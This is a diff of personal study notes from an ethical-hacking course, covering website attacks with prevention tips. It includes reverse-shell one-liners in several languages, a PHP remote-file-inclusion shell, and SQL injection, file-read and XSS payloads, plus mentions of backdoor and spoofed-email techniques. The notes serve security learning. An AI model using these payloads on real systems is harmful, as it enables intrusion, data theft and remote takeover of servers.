@@ -41,6 +41,9 @@ Link https://www.udemy.com/learn-ethical-hacking-from-scratch
         
         2. Fake Access Point
     3. Server-side attacks: need to be MITM + hack devices via vulnerabilities
+
+        * Check Exploit Database - https://www.exploit-db.com/
+
         1. exploit misconfiguration: zenmap to get info on running programs and ports
 
         2. exploit backdoors
@@ -52,22 +55,35 @@ Link https://www.udemy.com/learn-ethical-hacking-from-scratch
         
         3. exploit code execution vulnerabilities: same as before + payload
         
-        4. Client-side attacks
-            1. Via File
-                * Create undetectable backdoor: use Veil-evasion to create backdoor with meterpreter and reverse connection payload. Check way to migrate to more stable process and run backdoor as a service to maintain connection even after restart
-                * Backdoor file that user will want: Au2Exe to generate script and right-to-left trick to backdoor any type of file
-                * Deliver backdoored file
-                    1. Backdoor on the fly with BDFPROXY and MITM attack -> not really a client side attack as we need to be MITM
-                    2. Social engineering to impersonate contact and trick user to get a file and download backdoor
-                        * Maltego (Information Gathering Tool) to gather info
-                        * Spoof email via sendemail and sendgrid SMTP service
-            2. Via URL: BeEF (Framework) launch attacks on a hooked target via URL
+    4. Client-side attacks
+        1. Via File
+            * Create undetectable backdoor: use Veil-evasion to create backdoor with meterpreter and reverse connection payload. Check way to migrate to more stable process and run backdoor as a service to maintain connection even after restart
+            * Backdoor file that user will want: Au2Exe to generate script and right-to-left trick to backdoor any type of file
+            * Deliver backdoored file
+                1. Backdoor on the fly with BDFPROXY and MITM attack -> not really a client side attack as we need to be MITM
+                2. Social engineering to impersonate contact and trick user to get a file and download backdoor
+                    * Maltego (Information Gathering Tool) to gather info
+                    * Spoof email via sendemail and sendgrid SMTP service
+        2. Via URL: BeEF (Framework) launch attacks on a hooked target via URL
 
 4. Post exploitation
     1. meterpreter to control target
     2. pivoting: using target to gain access to other devices => use Autoroute module from
 
-5. Website hacking                                        
+5. Website hacking
+    1. Information Gathering
+        * IP address and server info
+        * Domain name info
+        * Technologies used
+        * DNS records
+        * Other websites on the same server
+        * Unlisted subdomains
+        * Unlisted files and directories
+    2. File upload forms vulnerabilities
+    3. Form field / URL code execution vulnerabilities
+    4. File Inclusion Vulnerabilities (local or remote)
+    5. SQL Injection Vulnerabilities (POST, GET, Read / Write) via manual query manipulation or via SQLMap
+    6. Cross Site Scripting (XSS) vulnerabilities: Stored, Reflected, DOM based                                     
 
 # List of programs
 
@@ -88,6 +104,9 @@ Link https://www.udemy.com/learn-ethical-hacking-from-scratch
 * Maltego: information gathering tool used in social engineering attacks
 * BeEF: framework that allows to launch attacks on a hooked target. A target is hooked when it loads a URL containing custom script
 * Xarp: allows to monitor ARP tables and detect ARP spoofing attacks
+* weevly: programs that generate a shell, designed for web application pentesting (used in Form Field Vulnerabilities)
+* SQMap: discover SQL injections and Extract Data automatically
+* OWASP ZAP: discover Vulnerabilities automatically using OWASP ZAP
 
 # Lexicon
 
@@ -105,6 +124,9 @@ Link https://www.udemy.com/learn-ethical-hacking-from-scratch
     * preventing: change ARP entry for the router from dynamic to static
 * backdoor: only download from HTTPS + check file MD5 after download
 * detecting trojans: check properties of a file / run the file on a virtual machine and check resources / use hybrid-analysis.com sandbox service
+* File Upload, Code Execution and File Inclusions Vulnerabilities: only allow safe files to be uploaded (don't only check the extension!), don't use dangerous functions (passthru, ...), filter user input before execution, disable allow_url_fopen & allow_url_include, use static file inclusion
+* SQL Injections: use parameterized statements, separate data from SQL code + filters as a second line of defense + use one user per database with the least privileges
+* *XSS Vulnerabilities: Minimize user input on html, escape any untrusted input (&, <, >, ", ', /) before inserting it into page
 
 # Setup Lab
 
@@ -822,12 +844,197 @@ NOTE 2: If networks don't show up but interface is detected, try to put USB mode
 
 # Website Hacking
 
+* You can try to attack a webserver via different ways: web application pentesting (vulnerabilities), server-side attack, client side attack (admin targeting)
+
 ## Information Gathering
 
-## File Upload, Code Execution, File Inclusion Vulns
+* IP address and server info: Use Maltego, zenmap, netdiscover ...
+* Domain name info: Whois lookup - https://whois.domaintools.com
+* Technologies used: Netcraft site report - http://toolbar.netcraft.com/site_report?url= // Wappalyzer
+* DNS records: Robtex DNS Lookup - https://www.robtex.com
+* Other websites on the same server
+    * Using bing.com, search for "ip:<target ip>"
+    * Reverse DNS performed by Robtex (maybe not all of them will be listed)
+* Unlisted subdomains: use https://github.com/guelfoweb/knock.git
+* Unlisted files and directories:
+    * List: dirb <target> <wordlist> <options>
+    * Analyze: login page, myphpinfo.php, robots.txt
+
+## File Upload, Code Execution, File Inclusion Vulnerabilities
+
+### File upload forms vulnerabilities
+
+* when no restrictions have been put on file upload form, allowing user to upload executable files such as php.
+* Upload a php shell or backdoor via weevly (generate a shell - designed for web application pentesting)
+    * generate backdoor: weevly generate <password> <filename>
+    * upload generated file
+    * connect to it: weevly <url to file> <password>
+
+### Form Field / URL Code Execution Vulnerabilities
+
+* when no restriction or sanitazation have been put on form fields executing code on the server, allowing an attacker to execute OS commands
+    * ex: form asking for an IP, then executing the ping command
+    * type: <ip>;pwd;ls; ... (use ; to execute other commands)
+* can be used to get a reverse shell or upload any file using wget command
+* code execution commands attached in the resources
+
+        //CODE EXECUTION COMMAND
+
+        The following examples assums the hacker IP is 10.20.14 and use port 8080 for the connection.
+        Therefore in all f these cases you need to listen for port 8080 using the foolowing command
+        nc -vv -l -p 8080
+
+
+        BASH
+        bash -i >& /dev/tcp/10.20.14.203/8080 0>&1
+
+        PERL
+        perl -e 'use Socket;$i="10.20.14";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+        Python
+        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.20.14",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+        PHP
+        php -r '$sock=fsockopen("10.20.14",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+        Ruby
+        ruby -rsocket -e'f=TCPSocket.open("10.20.14",8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+        Netcat
+        nc -e /bin/sh 10.20.14 8080
+
+### File Inclusion Vulnerabilities
+
+#### Local File Inclusion Vulnerabilities
+
+* Allows an attacker to read ANY file on the same server
+* Access files outside www directory
+* ex: http://www.example.com/../../../../etc/passwd
+
+#### Remote File Inclusion Vulnerabilities
+
+* possible if allow_url / allow_url_include options are enabled in PHP (nano /etc/php5/cgi/php.ini)
+* Similar to local file inclusion but allows an attacker to read ANY file from ANY server
+* Execute php files from other servers on the current server
+* Store php files on other servers as .txt
+
+* Discovery & Exploitation: http://www.example.com/?page=http://10.0.2.15/reverse.txt
+
+        //reverse.txt FILE EXAMPLE
+
+        <?php
+            passthru('nc -e /bin.sh 10.0.2.15 8080');
+        ?>
+
+### Preventing File Upload, Code Execution and File Inclusions Vulnerabilities
+
+* File Upload Vulnerabilities: only allow safe files to be uploaded (don't only check the extension!)
+* Code Execution Vulnerabilities: don't use dangerous functions (passthru, ...), filter user input before execution
+* File Inclusion Vulnerabilities:
+    * Local: disable allow_url_fopen & allow_url_include (php.ini)
+    * Remote: use static file inclusion => don't use include($_GET('page'));
 
 ## SQL Injection Vulnerabilities
 
-## Cross Site Scripting Vulnerabilities
+* They are everywhere and very easy to make a mistake to make these exploits available:
+    * give access to the database (sensitive info)
+    * can be used to read local files outside www root
+    * can be used to log in as admin and further exploit system
+    * can be used to upload files
+
+### Discovering SQL Injections in pages using POST
+
+* Try to break the page using 'and', 'order by' or "'" => get error statement
+* Try to change the SQL query: 
+
+        normal => select * FROM accounts where username = 'pierre' and password='123456';
+
+        hack => select * FROM accounts where username = 'pierre' and password='123456' and 1=1#';
+        by inserting 123456' and 1=1# in the password field
+
+* Bypassing login pages
+    * inject in the password field:  123456' or 1=1# => statement that is always true
+    * inject in the name field: admin' #' => ignore the rest of the statement (the password= part)
+
+### SQL Injections in pages using GET
+
+* Discover
+
+        normal => select * from accounts where username = '$USERNAME' and password = '$PASSWORD'
+
+        hacked => change url parameters to inject additional query options
+
+* Reading database info
+    * Determine number of columns: Try breaking the page via order by x statement, starting with big numbers and lowering until you find the correct number of columns
+    * inject
+            union select 1,2,3, ... ,x in url
+    * inject
+            union select 1,database(),user(),version(),5
+
+* Finding database tables
+    * inject:
+            union select 1,table_name,null,null,5 from information_schema.tables where table_schema = 'current database'
+
+* Extracting sensitive data (such as passwords)
+    * Show all columns, by injecting:
+            union select 1,column_name,null,null,5 from information_schema.columns where table_name = 'table name'
+    * Inject
+            union select 1,username,password,is_admin,5 from 'table name'
+
+### Read and Write File on the Server using SQL injections
+   
+* Read file by injecting:
+        union select null,load_file('/etc/passwd'),null,null,null
+
+* Write file by injecting (if you have correct permission):
+        union select null,'example example',null,null,null into outfile '/tmp/phpAdmin/example.txt'
+
+### Discover injections and Extract Data with SQLMap
+
+* Tool designed to exploit sql injections
+
+        sqlmap -u "target url"
+        sqlmap -u "target url" --tables
+        sqlmap -u "target url" --columns -T accounts -D owasp10 --data => get data from table
+
+### Preventing SQL injections
+
+* Filters can be bypassed
+* Black list of commands can be bypassed
+* White list can be bypassed
+* Best solution: use parameterized statements, separate data from SQL code (prepare / execute with parameters) + filters as a second line of defense + use one user per database with the least privileges
+
+## Cross Site Scripting (XSS) Vulnerabilities
+
+* Allow an attacker to inject javascript code into a page
+* code is executed when the page loads, on the client machine, not the server
+* 3 types: Persistent / Stored XSS, Reflected XSS, DOM based XSS
+
+### Discovering Reflected XSS
+
+* Non persistent, not stored XSS, only work if the target visits a specially crafted URL
+* Test text boxes and url parameters with the form http://target.com/page.php?something=something
+    * ex of exploit: http://target.com/page.php?something=<script>alert("XSS");</script>
+
+### Discovering Stored XSS
+
+* Persistent, stored on the page or DB
+* Injected code is executed everytime the page is loaded
+* Example: script injected in a message saved to the database, loaded everytime someone load the list of messages
+
+### Exploit XSS - Hooking vulnerable Page Visitors To BeEF
+
+* Run any javascript code
+* BeEF framework can be used to hook targets
+    1. Inject BeEF hook in vulnerable pages (such as the example for Stored XSS)
+    2. Execute code from BeEF
+
+### Preventing XSS Vulnerabilities
+
+* Minimize user input on html
+* Escape any untrusted input (&, <, >, ", ', /) before inserting it into page
 
 ## Discovering Vulnerabilities automatically using OWASP ZAP
+
+* OWASP: Open Web Application Security Project https://www.owasp.org
+* OWASP ZAP (ZED Attack Proxy): automatically find vulnerabilities in web applications, free, can also be used for manual testing.
